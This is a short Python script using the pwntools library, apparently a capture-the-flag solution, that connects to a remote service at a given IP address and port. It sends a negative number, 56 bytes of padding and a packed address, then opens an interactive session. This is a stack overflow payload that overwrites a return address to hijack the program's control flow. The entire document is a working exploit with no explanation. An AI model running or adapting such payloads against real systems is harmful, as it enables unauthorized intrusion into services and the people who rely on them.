from pwn import *

if __name__ == '__main__':
    r = remote('84.201.137.163', 10236 )
    r.send(b'-1\n' + b'\x00' * 56 + p64(0x0040081A) + b'\n')
    r.interactive()